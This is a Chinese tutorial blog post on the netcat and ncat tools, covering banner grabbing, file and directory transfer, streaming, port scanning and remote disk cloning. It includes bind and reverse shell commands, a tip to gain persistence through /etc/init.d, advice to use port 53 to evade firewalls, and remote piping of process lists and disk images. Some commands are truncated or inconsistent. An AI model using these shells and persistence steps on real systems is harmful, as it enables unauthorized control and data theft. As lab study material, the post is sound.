# NETCAT

---

title: NETCAT
date: 2016-02-28 19:27:52
tags: ['kali第五章','基本工具']
toc: true
categories: technology

_NetCat网络工具的"瑞士军刀"，小身材，大智慧。_

## 0x00 NC简介

---

__ NetCat__ 是一个非常简单的Unix工具，可以读、写TCP或UDP网络连接(*network connection*)。它被设计成一个可靠的后端(*back-end*) 工具，通过与其他工具结合和重定向，你可以在脚本中以多种方式使用它。同时，它又是一个功能丰富的网络调试和开发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能。__NetCat__，它的实际可运行的名字叫__nc__，是一个很早就被提供，但没有公开的事实标准的Unix工具。使用__NC__命令所能完成的事情令人惊讶。

__NetCat__ 还可以当服务器使用，监听任意指定端口的连接请求(*inbound connection*)，并可做同样的读写操作。除了较小限制外，它实际并不关心自己以“客户端”模式还是“服务器”模式运行，它都会来回运送全部数据。在任何一种模式下，都可以设置一个非活动时间来强行关闭连接。　　它还可以通过UDP来完成这些功能，因此它就象一个telnet那样的UDP程序，用来测试你的UDP服务器。正如它的“U”所指的，UDP跟TCP相比是一种不可靠的数据传输，一些系统在使用UDP 传送大量数据时会遇到麻烦，但它还有一些用途。

你可能会问“为什么不用telnet来连接任意的端口”？问题提得好(valid)，这儿有一些理由。Telnet有“标准输入文件结束符(*standard input EOF*)”问题，所以需要在脚本中延迟计算以便等待网络输出结束。这就是netcat持续运行直到连接被关闭的主要原因。Telnet也不能传输任意的二进制数据，因为一些特定的字符会被解释为Telnet的参数而被从数据流中去除。Telnet还将它的一些诊断信息显示到标准输出上，而__NC__会将这信息与它的输出分开以不改变真实数据的传输，除非你要求它这么做。当然了，Telnet也不能监听端口，也不能使用UDP。 __NC__ 没有这些限制，比Telnet更小巧和快捷，而且还有一些其它的功能。

__NC__ 所做的就是在两台电脑之间建立链接并返回两个数据流，在这之后所能做的事就看你的想像力了。你能建立一个服务器，传输文件，与朋友聊天，传输流媒体或者用它作为其它协议的独立客户端。

## 0x01 telent/获取banner信息

---

nc-nv 1.1.1.1 110 邮件服务器pop3端口
nc-nv 1.1.1.1 25  邮件服务器smtp端口
nc-nv 1.1.1.1 80 网站80端口

* 实例：metasploitable2的ip地址为:192.168.14.22

 客户端模式下常用命令: 

```bash
$:nc -vn 192.168.14.22
```

## 0x02 传输文本信息

---

* 实例:简单的聊天:

服务端监听一个指定的端口:

```bash
$ nc -l -p 3333
// 查看3333端口是否已经开通
$ netstat -pantu | grep 3333
```

客户端发起一个 tcp 请求链接:

```bash
$ nc -nv 192.168.14.23 333
```

## 0x03 传输文件/目录

---

### 远程电子取证信息收集

在本地计算机监听特定端口:

```bash
// 使用管道命令将 3333 端口收到的文件重定向到 ps.txt 文件
$ nc -l -p 3333 > ps.txt
```

从被取证计算机传输收集信息给远端本地电脑:

```bash
// -q 1 标准输出完成以后1sec后自动断开连接
$ ps aux | nc -nv 192.168.14.20  3333 -q 1
```

### 传输文件

1.A作为接受端打开端口

``` bash
/ 将侦听到的3333端口的信息输出到1.mp4文件中
$ nc -lp 3333 > 1.mp4
```

B端为发送端:

```bash
// 将1.mp4文件的内容输送到目标ip的3333端口，传递完成一秒后断开连接
nc -nv 1.1.1.1 3333 < 1.mp4 -q 1
```

!> mac 下默认的 nc 不支持 q 参数，文件传输完成以后将会自动断开 client　端的连接

```bash
// mac
$ nc -l 3333 < 1.mp4
```

* 或者A作为发送端打开端口:

```bash
nc -q 1 -lp 3333 < a.mp4  -q 1 {将文件放在3333端口下，等着别人来下载,文件传输完成后1秒断开连接}
```

B作为接收端:

```bash
nc -nv 1.1.1.1 333 > a.mp4
```

### 传输目录

nc本身并不支持目录传送，而是必须结合其它的命令来完成。通常先将目录进行打包，让后将其通过管道灌到nc的一个端口，让后在接收端通过nc去连接服务器已经打开的侦听端口，当接收端得到打包的文件后在通过tar去解包重新还原出目录。

命令演示如下:

```bash
tar -cvf - filename/ | nc -lp 333 -q 1     {先打包目录，前一个tar打包命令的结果通过管道成为nc命令的输入，即将tar过的文件传到333端口里面，等人家来连接 }
```

```bash
nc 192.168.14.20 333 | tar -xvf -   {将接收到tar文件重定向后进行解包}
```

## 0x04 加密传输文件

---

同样的，先对文件进行加密 ，生成一个要传输的加密文件，在讲加密文件作为输入结果输入到nc里:

命令演示如下:
首先需要为操作系统安装加密模块功能:

```bash
apt-get install mcrypt
```

A端(kali)作为文件接收端:

```bash
kali @$: nc -lp 333 | mcrypt--flush-Fbqd -a rijndael-256 -m ecb > 1.mp4{在本地侦听333端口，等待接收文件(等待着别人给传文件)，将接收到的文件重定向对其进行解密，最后保存为本地文件！}
其实在本次传输过程中，是B端先将文件进行加密，之后再重定向通过nc传输给A端(kali)
```

B端(ubuntu)发送端：

```bash
ubuntu @$: mcrypt --flush -Fbq -a rijndael-256 -m ecb < a.mp4 | nc -nv 192.168.14.23 333 -q 1  {将a.mp4的内容输入给加密指令进行加密，之后将加密后的文件管道给nc，nc再去连接A端的333端口，一旦连上，立即传输，传输完成以后延迟1秒断开连接}
```

## 0x05 远程控制/木马

---

`nc`远程控制可以实现双向的远程控制，服务器端可以是控制端，也可以是被控制端。

A:kali Linux; B:ubuntu Linux

### 正向

首先下kali上运行nc的服务器端。

A 端 kali linux（服务器端）

```bash
kali@ $: nc -lp 333 -c bash  {通过nc建立的连接将bash传递给对方；符合我们通常的一个使用习惯吧，又服务器侦听一个端口，通过客户端来连接这个端口时，服务器端把自己的bash shell传递给客户端！}
```

B 端 ubuntu Linux

```bash
ubuntu@ $: nc -nv 192.168.14.23 333
```

`nc`正向连接适用于使用场景：当渗透进入对当操作系统后，将可在对方`/etc/init.d`目录下添加`nc`执行脚本实行永久控制！但由于对方防火墙配置这种场景几乎不存在！

### 方向

下面我们来个反向的:

A:kali 依旧作为服务器端负责侦听端口,但并不传递shell:

```bash
kali@ $: nc -lp 333
```

B端：ubuntu依旧是客户端:

```bash
ubuntu@ $: nc -nv 192.168.14.23 33 -c bash
// {通过 nc 连接到 kali 服务器端并将 shell 传递给服务器端成为被控制端！}
```

反向连接使用场景：攻击端负者侦听一个端口，而在被攻击端执行启动脚本时将`shell`传送给被攻击端!,通常使用`53`端口，既 NDS 转换端口！

当然在`windows`下只需要讲`bash`换成`cmd`就ok了！

## 0x06 流媒体服务器

---

流媒体服务器，首先需要流媒体客户端和流媒体服务端。
`nc`搭建流媒体服务器端(kali):

```bash
kali@ $: cat 1.mp4 | nc -lp 333
// {使用cat命令将视频文件cat为文件流管道给nc侦听的333端口}
```

B端接收端(ubuntu):

```bash
ubuntu @ $: nc -nv 192.168.14.23 333 | mplayer -vo x11 -cache 3000-
// {B端nc连接到A端的侦听端口获得文件流，指定mplayer播放器进行缓存播放}
```

## 0x07 端口扫描

---

`nc`同样可以作为一个扫描器来使用，`nc`作为扫描器是以一个客户端的软件形象来出现的， `nc -z`开始扫描探测模式:

命令演示，打开 metasploitable(192.168.14.21)：

```bash
kali @ $: nc -nvz 192.168.
```

但是此种方式`nc`所探测的只是`TCP`模式的端口，`UDP`端口命令则是:

```bash
kali @$: nc -nvzu 1
```

## 0x08 远程克隆硬盘

---

如果目标系统整处于运行状态则可以收集其内存信息，进程信息，文件系统，网络连接等。通过远程电子取证，可以将目标服务器硬盘或者内存远程复制。

A端接收端:

```bash
nc -lp 333 | dd of=/dev/sda
```

B端，目标服务器:

```bash
dd if=/dev/sda | nc -nv 192.168.14.21 333 -q 1
```

使用`dd`命令对目标服务器进行块级别的复制，以便进行数据还原因为此时文件级别的复制已经没有意义！

## 0x09 nc的弱点

---

`nc`缺乏加密和身份验证的能力，容易被人嗅探，发生中间人劫持！基于`nc`的弱点，引入`NCAT`工具！

!> 不同操作系统／平台的`nc`参数功能不尽相同！譬如`ubuntu`下`nc`不支持`-c`参数，而是通过其他方法变通实现！

## 0xA ncat

---

### 使用 ncat 加密所有流量

首先`ncat`并不是`Linux`自带的一款工具，`ncat`包含于`nmap`工具中，用来弥补`nc`明文连接传输通道的不足！

A：kali 192.168.14.23  B：ubuntu 192.168.14.20

A：kali作为服务器端进行侦听端口，`allow`参数即是允许哪个ip连接，`-ssl` 进行管道传输加密！

```bash
ncat -c bash --allow 192.168.14.20 -vnl 333 --ssl
```

B端作为接收端：
B:ubuntu

```bash
ncat -nv 192.168.14.23 333 --ssl
```

通过`ncat`建立的远程连接与`nc`建立的远程连接是有本质区别的，`ncat`建立一起已经进行了秘钥的交换，并且在此后的传输通道也是经过加密的！此时即是有人来嗅探也是无济于事的,`ssl`还是挺有保障的！`nc`所能实现的所有功能在`ncat`上都能实现！

